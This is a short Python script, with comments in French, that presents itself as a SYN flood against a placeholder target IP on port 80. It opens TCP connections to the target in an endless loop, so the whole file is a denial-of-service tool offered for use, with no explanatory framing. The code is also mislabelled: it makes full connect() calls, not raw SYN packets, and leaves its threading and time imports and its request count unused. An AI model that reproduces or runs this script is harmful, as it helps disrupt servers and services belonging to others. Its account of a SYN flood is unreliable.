import socket
import threading
import time

target_ip = "XXXX"
target_port = 80  # Port cible (ajustez en fonction de vos besoins)
num_requests = 100

def syn_flood():
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(0.5)
        client.connect((target_ip, target_port))
    except Exception as e:
        print(f"Error: {e}")

def main():
    while True:
        syn_flood()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Script arrêté manuellement.")
